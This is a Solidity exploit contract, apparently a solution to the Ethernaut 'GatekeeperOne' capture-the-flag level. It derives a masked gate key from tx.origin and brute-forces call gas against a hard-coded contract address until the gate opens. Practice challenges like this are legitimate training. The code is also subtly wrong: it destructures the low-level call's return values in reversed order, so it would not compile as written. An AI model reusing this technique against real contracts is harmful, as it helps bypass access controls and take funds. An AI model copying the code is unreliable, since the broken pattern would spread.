// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../instances/Ilevel13.sol";

contract LetMeThrough {

    GatekeeperOne level13 = GatekeeperOne(0x27F9AB03aEd76ba2E93Ad7D8AcEE743b1F59b3ee);

   function exploit() external{
    bytes8  _gateKey  = bytes8(uint64(tx.origin)) & 0xFFFFFFFF0000FFFF;
    for  (uint256 i = 0; i < 300; i++) {
        (, bool success) = address(level13).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
        if  (success){
            break;
         }
     }
}
}